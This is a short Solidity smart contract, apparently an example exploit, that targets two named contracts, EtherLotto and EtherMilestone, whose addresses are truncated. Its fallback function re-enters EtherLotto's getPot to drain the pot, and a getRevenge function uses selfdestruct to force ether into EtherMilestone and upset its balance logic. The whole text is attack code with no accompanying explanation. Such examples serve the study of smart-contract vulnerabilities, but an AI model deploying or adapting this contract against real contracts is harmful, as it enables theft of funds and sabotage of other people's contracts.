contract MaliciousContract {
    uint ticket;
    EtherLotto el = EtherLotto(0xbf0061dc...);
    EtherMilestone em = EtherMilestone(0xc50164dfa...);
    function playLotto() {
        ticket = msg.value;
        el.playTicket.value(ticket)();
        el.getPot();
    }
    function playMilestone() {
    	em.play.value(1)();
    }
    function getRevenge ( ) {
    	selfdestruct(em);
    }
    function () payable {
    	el.getPot();
    }
}
